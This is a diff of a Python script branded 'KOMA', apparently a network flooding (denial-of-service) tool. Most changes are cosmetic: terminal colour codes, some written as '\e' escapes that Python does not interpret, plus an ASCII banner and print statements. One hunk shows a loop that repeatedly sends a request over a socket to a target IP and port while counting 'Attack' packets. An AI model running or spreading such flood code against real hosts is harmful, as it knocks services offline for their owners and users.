@@ -10,37 +10,39 @@ import random
 import threading
 import time
 
+# Colors
 class bcolors:
-    ZA = '\033[97m'
-    ZA1 = '\033[31m'
-    ZA2 = '\033[32m'
-    ZA3 = '\033[33m'
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    RESET = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-
+    HEADER = '\e[95m'
+    OKBLUE = '\e[94m'
+    OKCYAN = '\e[96m'
+    OKGREEN = '\e[92m'
+    WARNING = '\e[93m'
+    UNDERLINE = '\e[4m'
+    PURPLE = '\033[97m'
+    BOLD    = "\e[1m"
+    BLACK   = "\e[30m"
+    RED     = "\e[31m"
+    GREEN   = "\e[32m"
+    YELLOW  = "\e[33m"
+    BLUE    = "\e[34m"
+    MAGENTA = "\e[35m"
+    CYAN    = "\e[36m"
+    WHITE   = "\e[37m"
+    
 
 # CLEAR
 
 os.system("clear")
 print("")
-print("        🟤     🟤     🟤 🟤      🟤 🟤    🟤 🟤       🟤 🟤         ")
-print("        🟤    🟤    🟤     🟤    🟤  🟤  🟤  🟤    🟤      🟤       ")
-print("        🟤   🟤    🟤       🟤   🟤   🟤🟤   🟤   🟤        🟤      ")
-print("        ⚫ ⚫      ⚫       ⚫   ⚫    ⚫    ⚫   ⚫        ⚫      ")
-print("        ⚫ ⚫      ⚫       ⚫   ⚫    ⚫    ⚫   ⚫        ⚫      ")
-print("        🔵   🔵    🔵       🔵   🔵          🔵   🔵  🔵🔵🔵🔵      ")
-print("        🔵    🔵    🔵     🔵    🔵          🔵   🔵        🔵      ")
-print("        🔵     🔵     🔵 🔵      🔵          🔵   🔵        🔵      ")
+print("\033[96m      ±±     ±±     ±± ±±     ±±         ±±     ±± ±±           \033[0m")
+print("\033[96m      ±±   ±±     ±±     ±±   ±± ±±   ±± ±±   ±±     ±±         \033[0m")
+print("\033[96m      ±± ±±      ±±       ±±  ±±  ±± ±±  ±±  ±±       ±±        \033[0m")
+print("\033[97m      ±± ±±      ±±       ±±  ±±    ±    ±±  ±±       ±±        \033[0m")
+print("\033[97m      ±±   ±±     ±±     ±±   ±±         ±±  ±± ±± ±± ±±        \033[0m")
+print("\033[97m      ±±     ±±     ±± ±±     ±±         ±±  ±±       ±±        \033[0m")
 print("\033[33m================================================================\033[0m")
-print("\033[92m               use this script for good purpose                  \033[0m")
-print("\033[92m                        design by: Za'99                         \033[0m")
+print("\033[92m               use this script for good purpose                 \033[0m")
+print("\033[92m                        design by: Za'99                        \033[0m")
 print("\033[92m                           --oO0Oo--                            \033[0m")
 print("\033[33m================================================================\033[0m")                  
 
@@ -109,13 +111,13 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[+\033[96m]\033[33mKOMA  \033[92mAttack {0}:{1}  \033[97mSent:..{2}\033[0m".format(str(ip), int(port), xx))
+                print("⚡\033[96m[+\033[96m]\033[32mKOMA  \033[92mAttack {0}:{1}  \033[33mSent::..{2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[+\033[96m]\033[33mKOMA  \033[92mAttack {0}:{1}  \033[97mSent::...{2}\033[0m".format(str(ip), int(port), xx))
+                print("⚡\033[96m[+\033[96m]\033[35mKOMA  \033[92mAttack {0}:{1}  \033[37mSent::..{2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[+\033[96m]\033[33mKOMA  \033[92mAttack {0}:{1}  \033[97mSent:::....{2}\033[0m".format(str(ip), int(port), xx))
+                print("⚡\033[96m[+\033[96m]\033[36mKOMA  \033[92mAttack {0}:{1}  \033[34mSent::..{2}\033[0m".format(str(ip), int(port), xx))
         
         except:
                s.close()
